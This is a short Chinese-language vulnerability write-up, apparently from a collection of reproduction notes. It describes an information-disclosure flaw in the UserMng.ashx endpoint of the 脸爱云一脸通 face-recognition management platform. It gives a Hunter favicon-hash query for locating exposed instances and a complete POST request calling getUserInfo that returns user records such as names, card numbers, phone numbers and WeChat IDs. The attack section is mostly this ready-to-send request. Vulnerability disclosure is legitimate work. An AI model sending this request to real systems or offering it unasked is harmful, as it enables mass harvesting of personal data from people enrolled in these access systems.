# 脸爱云一脸通智慧管理平台UserMng存在信息泄露漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台UserMng存在信息泄露漏洞。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 脸爱云一脸通智慧管理平台

# 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征

![1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28.png](./img/b8NwS0h2DS3f8eR9/1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28-630933.png)

# 四、漏洞复现
```java
POST /UserMng.ashx HTTP/1.1
Host: 
Content-Length: 483
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

page=1&arr_search=%7B%22bmmc%22%3A%22%22%2C%22rfzt%22%3A%22%22%2C%22cardid%22%3A%22%22%2C%22klb%22%3A%22%22%2C%22ryxm%22%3A%22%22%2C%22rybh%22%3A%22%22%2C%22sex%22%3A%22%22%2C%22ryzt%22%3A%22%22%2C%22rfoperator%22%3A%22%22%2C%22EngName%22%3A%22%22%2C%22WeChat%22%3A%22%22%2C%22Tel%22%3A%22%22%2C%22groupname%22%3A%22%22%2C%22jituanname%22%3A%22%22%2C%22companyname%22%3A%22%22%2C%22startime%22%3A%22%22%2C%22endtime%22%3A%22%22%2C%22order%22%3A%22khrq+desc%22%7D&funcName=getUserInfo
```

![1714290261285-83391a2e-b164-4fff-945a-1c541911cbe1.png](./img/b8NwS0h2DS3f8eR9/1714290261285-83391a2e-b164-4fff-945a-1c541911cbe1-043774.png)



> 更新: 2024-04-28 15:44:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/idm4ngqgtd85umqv>